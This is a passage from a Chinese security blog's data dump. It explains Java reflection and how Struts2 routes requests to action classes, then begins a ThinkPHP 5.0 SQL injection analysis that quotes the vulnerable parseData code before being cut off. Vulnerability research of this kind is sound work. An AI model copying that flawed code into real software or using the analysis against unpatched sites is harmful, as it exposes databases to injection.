3.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151323-30c40c56-311d-1.png)\n\n从上图可见，action其实是由buildAction方法生成\n\n接着来跟一下buildAction方法，见下图\n\n![48b46e2180c5d6db6405ee2b0ff41045.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151332-368f0d20-311d-1.png)\n\nbuildAction方法的作用是通过读取struts.xml中的配置，构建操作类的实例以处理特定请求（例如，Web请求）并最终返回一个用来处理web请求的action类的实例。从上图可见，buildAction方法会调用buildBean方法以返回用来处理web请求的action类的实例\n\n我们跟入buildBean方法中，看一下传入的config.getClassName()是什么，具体见下图\n\n![62369956c2b679acc8560be6686fbe45.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151340-3b6c622a-311d-1.png)\n\nbuildBean方法的作用是构建给定类型的通用Java object。这里的传入buildBean方法的className是一个String类型的字符串，值为com.demo.action.LoginAction，这是根据我们struts.xml中的配置得来见下图\n\n![05a227b38e238c07a5e0b1b4c67a31cc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151349-409c45ee-311d-1.png)\n\n在struts.xml中，配置了Name为login的请求对应class为com.demo.action.LoginAction\n\n回到createAction方法中，此时类对象的生成过程已经明确了，最终invoke方法中的action参数其实是Object类型的LoginAction类的实例\n\n### method的生成\n\n接着我们来分析下下图中红框处的method是如何获得的\n\n![0a81230905512b16cdedc98c7efd35ec.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151359-46849114-311d-1.png)\n\nmethod是在invokeAction中392行处这里生成，见下图红框处\n\n![179799d70af0f7d7338380d993abd40d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151412-4e8d59c2-311d-1.png)\n\n首先看下getAction方法，这个方法在上文类对象生成一节已经分析过了，针对被例来说，该方法返回了一个Object类型的LoginAction类的实例。\n\n接着，通过getClass方法由LoginAction类的实例获取LoginAction类的class对象，这里可以参考上文java反射一章中最后的那个例子。\n\n最后通过getMethod方法，传入methodName(默认execute)，获取LoginAction类的execute方法\n\n### invoke执行\n\n上文已经将method与action分析完毕。最终程序将调用invoke执行LoginAction类的execute方法来处理请求\n\n![166379e4abc2b4baa643e37ed64064ce.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151425-55b78650-311d-1.png)\n\n参考链接\n--------\n\nhttp://tengj.top/2016/04/28/javareflect/","slug":"strutsReflect","published":1,"updated":"2020-10-28T01:24:58.996Z","_id":"ckgrozua1004swsa9354s1jhp","comments":1,"layout":"post","photos":[],"link":"","content":"<p>本文不是对Struts2漏洞进行分析，而是对Struts2框架机制的一些简单的理解。这将有助于对Struts2漏洞进行深入的理解。</p>\n<a id=\"more\"></a>\n\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>Struts2历史上出现过大大小小几十个漏洞。在分析漏洞的时候，除了需要理解漏洞是如何触发的，我对Struts2框架的原理比较好奇。众所周知，Struts2是通过配置struts.xml来定义请求和处理该请求的Action之间的对应关系等等。</p>\n<p>Struts.xml类似下图这样的形式</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107150944-ae5a3948-311c-1.png\" alt=\"7a745298d3d0178fcf6aafb0c8fbc817.png\"></p>\n<p>其中一个问题就是，Struts2是如何将请求和处理action通过struts.xml关联起来的？</p>\n<p>其中的过程比较有意思，本文将简单针对这个机制的分析一下</p>\n<p>Struts2官网给出的执行流程图如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151003-b994e0ba-311c-1.png\" alt=\"edeb6b0a750daef4e0a968e14f6e2807.png\"></p>\n<p>在上图红框处，可见ActionInvocation模块，这一模块将调用拦截器并执行开发者编写的Action。ActionInvocation模块正是解答我们问题的关键之处，后文将从这里开始分析。</p>\n<p>在分析流程之前，首先要说明一下：在Struts2框架中，程序将请求和处理action通过struts.xml关联起来的过程是基于java的反射机制实现的。</p>\n<h2 id=\"Java反射机制\"><a href=\"#Java反射机制\" class=\"headerlink\" title=\"Java反射机制\"></a>Java反射机制</h2><p>关于java反射，官方给出的解释如下</p>\n<p>Reflection enables Java code to discover information about the fields, methods<br>and constructors of loaded classes, and to use reflected fields, methods, and<br>constructors to operate on their underlying counterparts, within security<br>restrictions.<br>The API accommodates applications that need access to either the public members<br>of a target object (based on its runtime class) or the members declared by a<br>given class. It also allows programs to suppress default reflective access<br>control.</p>\n<p>百度词条给出的解释如下</p>\n<p>JAVA反射机制是在运行状态中，对于任意一个实体类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制。</p>\n<p>针对于反射机制，我的理解是：通常情况下，我们在编译前需要确定类型并创建对象；但反射机制使得我们可以在运行时动态地创建对象并调用其属性，即使此时的对象类型在编译期是没有被确定的。</p>\n<p>关于反射简单的使用，可以见一下代码</p>\n<p>以下代码改编自<a href=\"http://tengj.top/2016/04/28/javareflect/\">http://tengj.top/2016/04/28/javareflect/</a></p>\n<p>大家可以看看这个文章，写的非常详细，我节选了其中一个简单的案例进行简单的介绍</p>\n<p>ReflectDemo.java</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151015-c0e085c2-311c-1.png\" alt=\"d4ad6409be4ceee62a69c731f3778788.png\"></p>\n<p>Person类</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151022-c4e506e8-311c-1.png\" alt=\"a841d0ce7541078e003c64818a90db4a.png\"></p>\n<p>接下来我们详细的分析下：</p>\n<p>首先看下图红框处这一行</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151029-c99e30d8-311c-1.png\" alt=\"2c55b98575b6dddaa8729daa6b8fde20.png\"></p>\n<p>这里使用了Class.forName(“com.grq.reflect.Person”)<br>生成了一个名为c的Person类的Class。这里的c为Class类型，Class.forName<br>方法的作用就是初始化给定的类</p>\n<p>生成Person类的Class大致有三种方法，除了demo中给出的，还有如下两种，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151043-d1c8923a-311c-1.png\" alt=\"0d298df35d8bfe6c2abb46bbe55bac9f.png\"></p>\n<p>分别是通过获取类的静态成员变量class与通过对象的getClass()方法获取Class</p>\n<p>回到正文，接下来看下图红框处这一行</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151052-d6c5544e-311c-1.png\" alt=\"b44769116bbaedd23b2c53cdc6978593.png\"></p>\n<p>newInstance方法可以初始化生成一个实例。newInstance方法最终调用public无参构造函数。如果类没有public无参数的构造函数就会报错了。如果我们把Person类中的public无参数构造方法删除，就会出现对应下图的报错</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151100-dc1c69a0-311c-1.png\" alt=\"6744b9ce5559b604b226564358d675c6.png\"></p>\n<p>newInstance()方法与new关键字类似但却不同：newInstance()使用的是类加载机制，而new关键字是创建一个新对象</p>\n<p>接下来看下图红框处这一行</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151109-e171763e-311c-1.png\" alt=\"6962a7052fde7cbc3b18bf27d4b21f71.png\"></p>\n<p>getMethod方法可以得到该类不包括父类的所有的方法，通过传入参数确定具体要获得的方法。这里通过c.getMethod(“fun”,String.class, int.class)获得Person类的fun方法</p>\n<p>接下来看下图红框处这一行</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151118-e6627daa-311c-1.png\" alt=\"7a376a707b6755f1156b535643d3b8f4.png\"></p>\n<p>invoke的作用是执行方法，如果这个方法是一个普通方法，那么第一个参数是类对象,如果这个方法是一个静态方法，那么第一个参数是类。后面的参数为将要传递的参数值</p>\n<p>执行结果如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151128-ec6bf6d6-311c-1.png\" alt=\"31ad77d7773a070cd0757bd4e1ae48a5.png\"></p>\n<p>到此，简单的Java反射机制介绍结束。</p>\n<h3 id=\"一种不同的写法\"><a href=\"#一种不同的写法\" class=\"headerlink\" title=\"一种不同的写法\"></a>一种不同的写法</h3><p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151138-f2b01e8c-311c-1.png\" alt=\"3e025137eb06925d78af77371bbecdeb.png\"></p>\n<p>在上图中，我们使用o.getClass()代替c，最终的结果如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151153-fba00476-311c-1.png\" alt=\"0abe72def9e4b294cdc147d7007b49d7.png\"></p>\n<p>可见o.getClass与c的Class对象所表示的实体名称是一致的，都是com.grq.reflect.Person。为什么要举这个例子呢？，因为Struts2里就是采用o.getClass这种形式进行反射的。</p>\n<h2 id=\"Struts2反射机制\"><a href=\"#Struts2反射机制\" class=\"headerlink\" title=\"Struts2反射机制\"></a>Struts2反射机制</h2><p>首先我们用S2-001的Deme进行举例</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151206-0359e434-311d-1.png\" alt=\"7d91ec6535988f2edd189c7207305c0d.png\"></p>\n<p>当<a href=\"http://localhost:8080/s2_t_war_exploded/login.action\">http://localhost:8080/s2_t_war_exploded/login.action</a><br>请求发送到后台时，让我们来看一下struts2是如何利用反射机制寻找到对应的LoginAction类进行处理</p>\n<p>跟入后台com/opensymphony/xwork2/DefaultActionInvocation.java文件</p>\n<p>程序调用invokeAction方法寻找用来处理请求的action类与对应的方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151235-14bcbc88-311d-1.png\" alt=\"3d16b7c6b7d4daec699fdefe85b9c734.png\"></p>\n<p>在invokeAction方法中的404行处，见上图，程序最终通过invoke执行对应action类对象(上图红框处action)的对应方法(上图红框处method)</p>\n<p>我们接下来分析下action类对象以及对应方法的生成过程</p>\n<h3 id=\"类对象的生成\"><a href=\"#类对象的生成\" class=\"headerlink\" title=\"类对象的生成\"></a>类对象的生成</h3><p>首先我们来分析下下图中红框处的类对象是怎么获得的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151243-1945e7d4-311d-1.png\" alt=\"54c598ae0df1ee0c457c190aff11eb9a.png\"></p>\n<p>invokeAction方法见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151251-1db5c384-311d-1.png\" alt=\"c98ad56cf48b5503128856bc55a4433f.png\"></p>\n<p>Invoke中传入的Object类型的action参数其实是在invokeAction被调用时传递进来的</p>\n<p>接着我们来看一下invokeAction被调用时的情况，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151258-21fc5872-311d-1.png\" alt=\"cb333de473a98d0e3fadfb776b480d33.png\"></p>\n<p>从上图可见，action参数是通过getAction方法获得</p>\n<p>跟入getAction方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151308-28102e6e-311d-1.png\" alt=\"7dd8c940303541080e8d767c38105dee.png\"></p>\n<p>getAction方法直接将action返回</p>\n<p>接着看下这个action是如何生成的，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151323-30c40c56-311d-1.png\" alt=\"06895aa95cc394121d527a90da29ed13.png\"></p>\n<p>从上图可见，action其实是由buildAction方法生成</p>\n<p>接着来跟一下buildAction方法，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151332-368f0d20-311d-1.png\" alt=\"48b46e2180c5d6db6405ee2b0ff41045.png\"></p>\n<p>buildAction方法的作用是通过读取struts.xml中的配置，构建操作类的实例以处理特定请求（例如，Web请求）并最终返回一个用来处理web请求的action类的实例。从上图可见，buildAction方法会调用buildBean方法以返回用来处理web请求的action类的实例</p>\n<p>我们跟入buildBean方法中，看一下传入的config.getClassName()是什么，具体见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151340-3b6c622a-311d-1.png\" alt=\"62369956c2b679acc8560be6686fbe45.png\"></p>\n<p>buildBean方法的作用是构建给定类型的通用Java object。这里的传入buildBean方法的className是一个String类型的字符串，值为com.demo.action.LoginAction，这是根据我们struts.xml中的配置得来见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151349-409c45ee-311d-1.png\" alt=\"05a227b38e238c07a5e0b1b4c67a31cc.png\"></p>\n<p>在struts.xml中，配置了Name为login的请求对应class为com.demo.action.LoginAction</p>\n<p>回到createAction方法中，此时类对象的生成过程已经明确了，最终invoke方法中的action参数其实是Object类型的LoginAction类的实例</p>\n<h3 id=\"method的生成\"><a href=\"#method的生成\" class=\"headerlink\" title=\"method的生成\"></a>method的生成</h3><p>接着我们来分析下下图中红框处的method是如何获得的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151359-46849114-311d-1.png\" alt=\"0a81230905512b16cdedc98c7efd35ec.png\"></p>\n<p>method是在invokeAction中392行处这里生成，见下图红框处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151412-4e8d59c2-311d-1.png\" alt=\"179799d70af0f7d7338380d993abd40d.png\"></p>\n<p>首先看下getAction方法，这个方法在上文类对象生成一节已经分析过了，针对被例来说，该方法返回了一个Object类型的LoginAction类的实例。</p>\n<p>接着，通过getClass方法由LoginAction类的实例获取LoginAction类的class对象，这里可以参考上文java反射一章中最后的那个例子。</p>\n<p>最后通过getMethod方法，传入methodName(默认execute)，获取LoginAction类的execute方法</p>\n<h3 id=\"invoke执行\"><a href=\"#invoke执行\" class=\"headerlink\" title=\"invoke执行\"></a>invoke执行</h3><p>上文已经将method与action分析完毕。最终程序将调用invoke执行LoginAction类的execute方法来处理请求</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151425-55b78650-311d-1.png\" alt=\"166379e4abc2b4baa643e37ed64064ce.png\"></p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><p><a href=\"http://tengj.top/2016/04/28/javareflect/\">http://tengj.top/2016/04/28/javareflect/</a></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>本文不是对Struts2漏洞进行分析，而是对Struts2框架机制的一些简单的理解。这将有助于对Struts2漏洞进行深入的理解。</p>","more":"<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>Struts2历史上出现过大大小小几十个漏洞。在分析漏洞的时候，除了需要理解漏洞是如何触发的，我对Struts2框架的原理比较好奇。众所周知，Struts2是通过配置struts.xml来定义请求和处理该请求的Action之间的对应关系等等。</p>\n<p>Struts.xml类似下图这样的形式</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107150944-ae5a3948-311c-1.png\" alt=\"7a745298d3d0178fcf6aafb0c8fbc817.png\"></p>\n<p>其中一个问题就是，Struts2是如何将请求和处理action通过struts.xml关联起来的？</p>\n<p>其中的过程比较有意思，本文将简单针对这个机制的分析一下</p>\n<p>Struts2官网给出的执行流程图如下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151003-b994e0ba-311c-1.png\" alt=\"edeb6b0a750daef4e0a968e14f6e2807.png\"></p>\n<p>在上图红框处，可见ActionInvocation模块，这一模块将调用拦截器并执行开发者编写的Action。ActionInvocation模块正是解答我们问题的关键之处，后文将从这里开始分析。</p>\n<p>在分析流程之前，首先要说明一下：在Struts2框架中，程序将请求和处理action通过struts.xml关联起来的过程是基于java的反射机制实现的。</p>\n<h2 id=\"Java反射机制\"><a href=\"#Java反射机制\" class=\"headerlink\" title=\"Java反射机制\"></a>Java反射机制</h2><p>关于java反射，官方给出的解释如下</p>\n<p>Reflection enables Java code to discover information about the fields, methods<br>and constructors of loaded classes, and to use reflected fields, methods, and<br>constructors to operate on their underlying counterparts, within security<br>restrictions.<br>The API accommodates applications that need access to either the public members<br>of a target object (based on its runtime class) or the members declared by a<br>given class. It also allows programs to suppress default reflective access<br>control.</p>\n<p>百度词条给出的解释如下</p>\n<p>JAVA反射机制是在运行状态中，对于任意一个实体类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制。</p>\n<p>针对于反射机制，我的理解是：通常情况下，我们在编译前需要确定类型并创建对象；但反射机制使得我们可以在运行时动态地创建对象并调用其属性，即使此时的对象类型在编译期是没有被确定的。</p>\n<p>关于反射简单的使用，可以见一下代码</p>\n<p>以下代码改编自<a href=\"http://tengj.top/2016/04/28/javareflect/\">http://tengj.top/2016/04/28/javareflect/</a></p>\n<p>大家可以看看这个文章，写的非常详细，我节选了其中一个简单的案例进行简单的介绍</p>\n<p>ReflectDemo.java</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151015-c0e085c2-311c-1.png\" alt=\"d4ad6409be4ceee62a69c731f3778788.png\"></p>\n<p>Person类</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151022-c4e506e8-311c-1.png\" alt=\"a841d0ce7541078e003c64818a90db4a.png\"></p>\n<p>接下来我们详细的分析下：</p>\n<p>首先看下图红框处这一行</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151029-c99e30d8-311c-1.png\" alt=\"2c55b98575b6dddaa8729daa6b8fde20.png\"></p>\n<p>这里使用了Class.forName(“com.grq.reflect.Person”)<br>生成了一个名为c的Person类的Class。这里的c为Class类型，Class.forName<br>方法的作用就是初始化给定的类</p>\n<p>生成Person类的Class大致有三种方法，除了demo中给出的，还有如下两种，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151043-d1c8923a-311c-1.png\" alt=\"0d298df35d8bfe6c2abb46bbe55bac9f.png\"></p>\n<p>分别是通过获取类的静态成员变量class与通过对象的getClass()方法获取Class</p>\n<p>回到正文，接下来看下图红框处这一行</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151052-d6c5544e-311c-1.png\" alt=\"b44769116bbaedd23b2c53cdc6978593.png\"></p>\n<p>newInstance方法可以初始化生成一个实例。newInstance方法最终调用public无参构造函数。如果类没有public无参数的构造函数就会报错了。如果我们把Person类中的public无参数构造方法删除，就会出现对应下图的报错</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151100-dc1c69a0-311c-1.png\" alt=\"6744b9ce5559b604b226564358d675c6.png\"></p>\n<p>newInstance()方法与new关键字类似但却不同：newInstance()使用的是类加载机制，而new关键字是创建一个新对象</p>\n<p>接下来看下图红框处这一行</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151109-e171763e-311c-1.png\" alt=\"6962a7052fde7cbc3b18bf27d4b21f71.png\"></p>\n<p>getMethod方法可以得到该类不包括父类的所有的方法，通过传入参数确定具体要获得的方法。这里通过c.getMethod(“fun”,String.class, int.class)获得Person类的fun方法</p>\n<p>接下来看下图红框处这一行</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151118-e6627daa-311c-1.png\" alt=\"7a376a707b6755f1156b535643d3b8f4.png\"></p>\n<p>invoke的作用是执行方法，如果这个方法是一个普通方法，那么第一个参数是类对象,如果这个方法是一个静态方法，那么第一个参数是类。后面的参数为将要传递的参数值</p>\n<p>执行结果如下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151128-ec6bf6d6-311c-1.png\" alt=\"31ad77d7773a070cd0757bd4e1ae48a5.png\"></p>\n<p>到此，简单的Java反射机制介绍结束。</p>\n<h3 id=\"一种不同的写法\"><a href=\"#一种不同的写法\" class=\"headerlink\" title=\"一种不同的写法\"></a>一种不同的写法</h3><p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151138-f2b01e8c-311c-1.png\" alt=\"3e025137eb06925d78af77371bbecdeb.png\"></p>\n<p>在上图中，我们使用o.getClass()代替c，最终的结果如下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151153-fba00476-311c-1.png\" alt=\"0abe72def9e4b294cdc147d7007b49d7.png\"></p>\n<p>可见o.getClass与c的Class对象所表示的实体名称是一致的，都是com.grq.reflect.Person。为什么要举这个例子呢？，因为Struts2里就是采用o.getClass这种形式进行反射的。</p>\n<h2 id=\"Struts2反射机制\"><a href=\"#Struts2反射机制\" class=\"headerlink\" title=\"Struts2反射机制\"></a>Struts2反射机制</h2><p>首先我们用S2-001的Deme进行举例</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151206-0359e434-311d-1.png\" alt=\"7d91ec6535988f2edd189c7207305c0d.png\"></p>\n<p>当<a href=\"http://localhost:8080/s2_t_war_exploded/login.action\">http://localhost:8080/s2_t_war_exploded/login.action</a><br>请求发送到后台时，让我们来看一下struts2是如何利用反射机制寻找到对应的LoginAction类进行处理</p>\n<p>跟入后台com/opensymphony/xwork2/DefaultActionInvocation.java文件</p>\n<p>程序调用invokeAction方法寻找用来处理请求的action类与对应的方法</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151235-14bcbc88-311d-1.png\" alt=\"3d16b7c6b7d4daec699fdefe85b9c734.png\"></p>\n<p>在invokeAction方法中的404行处，见上图，程序最终通过invoke执行对应action类对象(上图红框处action)的对应方法(上图红框处method)</p>\n<p>我们接下来分析下action类对象以及对应方法的生成过程</p>\n<h3 id=\"类对象的生成\"><a href=\"#类对象的生成\" class=\"headerlink\" title=\"类对象的生成\"></a>类对象的生成</h3><p>首先我们来分析下下图中红框处的类对象是怎么获得的</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151243-1945e7d4-311d-1.png\" alt=\"54c598ae0df1ee0c457c190aff11eb9a.png\"></p>\n<p>invokeAction方法见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151251-1db5c384-311d-1.png\" alt=\"c98ad56cf48b5503128856bc55a4433f.png\"></p>\n<p>Invoke中传入的Object类型的action参数其实是在invokeAction被调用时传递进来的</p>\n<p>接着我们来看一下invokeAction被调用时的情况，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151258-21fc5872-311d-1.png\" alt=\"cb333de473a98d0e3fadfb776b480d33.png\"></p>\n<p>从上图可见，action参数是通过getAction方法获得</p>\n<p>跟入getAction方法</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151308-28102e6e-311d-1.png\" alt=\"7dd8c940303541080e8d767c38105dee.png\"></p>\n<p>getAction方法直接将action返回</p>\n<p>接着看下这个action是如何生成的，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151323-30c40c56-311d-1.png\" alt=\"06895aa95cc394121d527a90da29ed13.png\"></p>\n<p>从上图可见，action其实是由buildAction方法生成</p>\n<p>接着来跟一下buildAction方法，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151332-368f0d20-311d-1.png\" alt=\"48b46e2180c5d6db6405ee2b0ff41045.png\"></p>\n<p>buildAction方法的作用是通过读取struts.xml中的配置，构建操作类的实例以处理特定请求（例如，Web请求）并最终返回一个用来处理web请求的action类的实例。从上图可见，buildAction方法会调用buildBean方法以返回用来处理web请求的action类的实例</p>\n<p>我们跟入buildBean方法中，看一下传入的config.getClassName()是什么，具体见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151340-3b6c622a-311d-1.png\" alt=\"62369956c2b679acc8560be6686fbe45.png\"></p>\n<p>buildBean方法的作用是构建给定类型的通用Java object。这里的传入buildBean方法的className是一个String类型的字符串，值为com.demo.action.LoginAction，这是根据我们struts.xml中的配置得来见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151349-409c45ee-311d-1.png\" alt=\"05a227b38e238c07a5e0b1b4c67a31cc.png\"></p>\n<p>在struts.xml中，配置了Name为login的请求对应class为com.demo.action.LoginAction</p>\n<p>回到createAction方法中，此时类对象的生成过程已经明确了，最终invoke方法中的action参数其实是Object类型的LoginAction类的实例</p>\n<h3 id=\"method的生成\"><a href=\"#method的生成\" class=\"headerlink\" title=\"method的生成\"></a>method的生成</h3><p>接着我们来分析下下图中红框处的method是如何获得的</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151359-46849114-311d-1.png\" alt=\"0a81230905512b16cdedc98c7efd35ec.png\"></p>\n<p>method是在invokeAction中392行处这里生成，见下图红框处</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151412-4e8d59c2-311d-1.png\" alt=\"179799d70af0f7d7338380d993abd40d.png\"></p>\n<p>首先看下getAction方法，这个方法在上文类对象生成一节已经分析过了，针对被例来说，该方法返回了一个Object类型的LoginAction类的实例。</p>\n<p>接着，通过getClass方法由LoginAction类的实例获取LoginAction类的class对象，这里可以参考上文java反射一章中最后的那个例子。</p>\n<p>最后通过getMethod方法，传入methodName(默认execute)，获取LoginAction类的execute方法</p>\n<h3 id=\"invoke执行\"><a href=\"#invoke执行\" class=\"headerlink\" title=\"invoke执行\"></a>invoke执行</h3><p>上文已经将method与action分析完毕。最终程序将调用invoke执行LoginAction类的execute方法来处理请求</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200107151425-55b78650-311d-1.png\" alt=\"166379e4abc2b4baa643e37ed64064ce.png\"></p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><p><a href=\"http://tengj.top/2016/04/28/javareflect/\">http://tengj.top/2016/04/28/javareflect/</a></p>"},{"title":"ThinkPHP 5.0版本 SQL注入漏洞分析","date":"2018-04-18T07:36:50.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n前段时间，ThinkPHP发布了V5.0.16版本的release，该版本提到了安全更新。本篇文章以此次安全更新入手，对ThinkPHP 5.0版本 SQL注入漏洞进行了详细分析。文末还有测试小问题，看看大家get到这个漏洞的精髓了吗？\n\n<!--more-->\n\n## 前言\n\nThinkphp V5.0.16版本的release说明如下：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/图片-1-8.png)\n\n说明中提到了安全更新，但并没有提到是什么安全问题。\n\nV5.0.16的commits记录如下，可以看到在3月26日出现了一个关于安全性的提交，但26日似乎没有一次性改好，在27日又对这个inc/dec查询改动了一次\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/2-11.png)\n\n接下来看下这个inc/dec查询到底有什么问题，需要一改再改。\n\n## **漏洞分析**\n\n先看下26日改了什么\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/3-11.png)\n\n再看看27日改了什么\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/4-10.png)\n\n改动都在Builder.php这个文件的相同位置，而且反反复复的折腾的，就是$val[1]这个变量。\n\n接下来看看完整的函数部分，看看$val[1]到底怎么了。\n\n漏洞部分在parseData函数\n<pre class=\"lang:default decode:true\">protected function parseData($data, $options)\n{\n    if (empty($data)) {\n        return [];\n    }\n\n    // 获取绑定信息\n    $bind = $this-&gt;query-&gt;getFieldsBind($options['table']);\n    if ('*' == $options['field']) {\n        $fields = array_keys($bind);\n    } else {\n        $fields = $options['field'];\n    }\n    \n    $result = [];\n    foreach ($data as $key =&gt; $val) {\n        $item = $this-&gt;parseKey($key, $options);\n        if (is_object($val) &amp;&amp;method_exists($val, '__toString')) {\n            // 对象数据写入\n            $val = $val-&gt;__toString();\n        }\n        if (false === strpos($key, '.') &amp;&amp; !in_array($key, $fields, true)) {\n            if ($options['strict']) {\n                throw new Exception('fields not 